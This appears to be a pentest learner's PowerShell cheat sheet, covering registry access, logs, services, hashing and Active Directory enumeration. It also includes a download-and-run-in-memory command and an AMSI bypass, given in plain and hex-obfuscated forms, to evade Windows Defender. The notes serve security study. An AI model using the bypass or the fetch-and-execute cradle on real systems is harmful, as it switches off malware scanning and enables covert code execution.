# Using PowerShell

author:: Nathan Acks  
date:: 2021-11-25

## Access the Registry Through PowerShell

You can actually access the registry from PowerShell using the `cd` command: `cd HKLM:\` will take you to the HKEY_LOCAL_MACHINE hive, for instance.

Major hives:

* HKEY_CLASSES_ROOT
* HKEY_CURRENT_USER
* HKEY_LOCAL_MACHINE
* HKEY_USERS
* HKEY_CURRENT_CONFIG

## Commands

### Accessing Windows Logs

Use the `Get-WinEvent` cmdlet.

### Domain Enumeration

```powershell
# Get domain users and associated groups
#
Get-DomainUsers | select name, memberof

# Get all domain group members, including nested domain groups
#
Get-DomainGroupMember -Identity $GROUP_NAME

# Show all users that previously logged on to a machine (defaults to
# local machine; requires admin privileges to be run against remote
# machines)
#
Get-NetLoggedon | select UserName

# Show all users who are logged in to a machine RIGHT NOW (does not
# require admin privileges for remote systems if run from Windows Server)
#
Get-NetSession
```

### Download a File

```powershell
# Download to disk
#
Invoke-WebRequest -Uri $URL_OF_FILE -OutFile $FILE_ON_DISK

# Download into a variable (useful for scripts!)
#
$SCRIPT_DATA = (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")

# Download and invoke from memory
#
IEX (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")
```

### Disable AMSI

Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of `IEX` for in-memory scripts!).

One bypass for this:

```powershell
[REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Note that AMSI uses a regular expression to trap all PowerShell commands that contain AMSI-function related strings, however. This can be bypassed by breaking up the above script into separate variables, or by doing fancy string encoding-and-reassembly tricks.

```powershell
[REF].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```

Be aware that AMSI bypasses are *per session*, not global!

### Manipulating Services

* `Get-Service` — list all services, or drill down on a particular service.
* `Start-Service -Name $SERVICE`/`sc start $SERVICE` — start $SERVICE.
* `Stop-Service -Name $SERVICE`/`sc stop $SERVICE` — stop $SERVICE.

### Calculating File Hashes

```powershell
Get-FileHash -Algorithm $ALGORITHM $FILE_PATH
```

The algorithm can be excluded (in which case SHA-256 is used). *Lots* of different hashing algorithms are supported — run `help Get-FileHash` to see a list.

## Run PowerShell from cmd.exe

```bat
powershell -c "$COMMAND"
```

## References

* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
* [Get-WinEvent](get-winevent.md)
* [TryHackMe: MAL: Researching](tryhackme-mal-researching.md)
* [2022-08-24 - OffSec Live: PEN-200 & AWS Deep Dive](../log/2022-08-24-offsec-live-pen-200-and-aws-deep-dive.md)
* [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
* [2022-08-26 - OffSec Live: PEN-200](../log/2022-08-26-offsec-live-pen-200.md)
